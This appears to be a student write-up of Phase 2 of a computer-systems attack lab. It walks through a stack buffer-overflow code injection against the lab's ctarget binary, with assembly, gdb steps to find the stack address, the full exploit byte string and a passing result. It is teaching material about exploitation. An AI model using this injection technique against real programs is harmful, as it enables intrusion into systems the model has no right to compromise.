# PHASE 2

Phase 2 involves injecting a small code and calling function touch2 while making it look like you passed the cookie as an argument to touch2

If you look inside the ```rtarget_dump.s``` fil and search for touch2, it looks something like this:
```assembly
0000000000401945 <touch2>:
  401945:       48 83 ec 08             sub    $0x8,%rsp
  401949:       89 fa                   mov    %edi,%edx
  40194b:       c7 05 c7 3b 20 00 02    movl   $0x2,0x203bc7(%rip)        # 60551c <vlevel>
  401952:       00 00 00 
  401955:       39 3d c9 3b 20 00       cmp    %edi,0x203bc9(%rip)        # 605524 <cookie>
  40195b:       75 20                   jne    40197d <touch2+0x38>
  40195d:       be d0 34 40 00          mov    $0x4034d0,%esi
  401962:       bf 01 00 00 00          mov    $0x1,%edi
  401967:       b8 00 00 00 00          mov    $0x0,%eax
  40196c:       e8 8f f4 ff ff          callq  400e00 <__printf_chk@plt>
  401971:       bf 02 00 00 00          mov    $0x2,%edi
  401976:       e8 77 05 00 00          callq  401ef2 <validate>
  40197b:       eb 1e                   jmp    40199b <touch2+0x56>
  40197d:       be f8 34 40 00          mov    $0x4034f8,%esi
  401982:       bf 01 00 00 00          mov    $0x1,%edi
  401987:       b8 00 00 00 00          mov    $0x0,%eax
  40198c:       e8 6f f4 ff ff          callq  400e00 <__printf_chk@plt>
  401991:       bf 02 00 00 00          mov    $0x2,%edi
  401996:       e8 33 06 00 00          callq  401fce <fail>
  40199b:       bf 00 00 00 00          mov    $0x0,%edi
  4019a0:       e8 ab f4 ff ff          callq  400e50 <exit@plt>
  ```
If you read the instruction pdf, it says, "Recall that the first argument to a function is passed in register %rdi."

So our goal is to modify the %rdi register and store our cookie in there.

So you have to write some assembly code for that task, create a file called ```phase2.s``` and write the below code, replacing the cookie with yours from the previous phase.
```assembly
  movq $0x3451d86d,%rdi /* move your cookie to register %rdi */
  retq                  /* return */
```
Now you need the byte representation of the code you wrote above, compile it with gcc then dissasemble it.

```ssh
gcc -c phase2.s
objdump -d phase2.o  > phase2.d 
```
Now open the file phase2.d and you will get something like below

```ssh
Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 6d d8 51 34 	mov    $0x3451d86d,%rdi
   7:	c3                   	retq   
```
The byte representation of the assembly code is ```48 c7 c7 6d d8 51 34 c3``` => cookie.

Now we need to find the address of rsp register:

Run ctarget through gdb
```gdb ctarget```

set a breakpoint at getbuf
```b getbuf```

run ctarget
```r```

Dissasemble it
```disas```

You will get something like below:
```assembly
=> 0x0000000000401903 <+0>:	sub    $0x18,%rsp
   0x0000000000401907 <+4>:	mov    %rsp,%rdi
   0x000000000040190a <+7>:	callq  0x401b8d <Gets>
   0x000000000040190f <+12>:	mov    $0x1,%eax
   0x0000000000401914 <+17>:	add    $0x18,%rsp
   0x0000000000401918 <+21>:	retq   
End of assembler dump.
```
Now we need to run the code until the instruction just below ```callq 0x401ab6 <Gets>``` so you will run the following command to get to the addres of that instruction:

```until *0x40190f```

Then you will gwt the promt ```Type string:``` type a string longer than the buffer(24 characters in this case). 

```c
Type string: Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. 
```

After that do:
```assembly
x/s $rsp
```

You will get something like
```assembly
0x55617e98:	"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut a"...
```
The address on the left side is what we want => ```0x55617e98```.

Now, create a text file named ```phase2.txt``` which will look something like below and don't forget the bytes for rsp and touch2 go in reverse (little endian).

```
48 c7 c7 6d d8 51 34 c3 /*this sets your cookie*/
00 00 00 00 00 00 00 00 /*padding to make it 24 bytes*/
00 00 00 00 00 00 00 00 /*padding to make it 24 bytes*/
98 7e 61 55 00 00 00 00 /* address of register %rsp */
45 19 40 00 00 00 00 00 /*address of touch2 function */
````
Run it through ```hex2raw```

```./hex2raw < phase2.txt > raw-phase2.txt```

Finally, you run the raw file

```./ctarget < raw-phase2.txt```

What the exploit does is that first it sets register rdi to our cookie value is transferred to $rsp register so after we enter our string and getbuf tries to return control to the calling function, we want it to point to the rsp address so it will execute the code to set the cookie and finally we call touch2 after the cookie is set.

```ssh
Cookie: 0x3451d86d
Type string:Touch2!: You called touch2(0x3451d86d)
Valid solution for level 2 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```




